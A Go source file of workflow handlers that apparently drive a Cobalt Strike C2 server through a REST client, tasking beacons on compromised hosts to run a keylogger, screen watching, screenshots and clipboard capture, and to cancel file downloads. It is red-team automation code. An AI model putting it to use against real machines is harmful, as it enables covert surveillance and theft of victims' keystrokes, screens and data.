package workflow

import (
	"context"
	"fmt"

	csclient "github.com/xenov-x/csrest"
)

// --- Capture Operation Handlers ---

// executeKeylogger starts a keylogger on the beacon
func (e *Executor) executeKeylogger(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.SpawnKeylogger(ctx, beaconID)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeScreenwatch starts screenwatch on the beacon
func (e *Executor) executeScreenwatch(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.SpawnScreenwatch(ctx, beaconID)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executePrintscreen captures a screenshot using print screen method
func (e *Executor) executePrintscreen(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.SpawnPrintScreen(ctx, beaconID)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeClipboard gets clipboard contents from the beacon
func (e *Executor) executeClipboard(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.Clipboard(ctx, beaconID)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// --- Download Management Handlers ---

// executeCancelDownload cancels an active file download on the beacon
func (e *Executor) executeCancelDownload(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	file, ok := action.Parameters["file"].(string)
	if !ok {
		return "", fmt.Errorf("file parameter required for cancel_download")
	}

	resp, err := client.CancelFileDownload(ctx, beaconID, file)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}
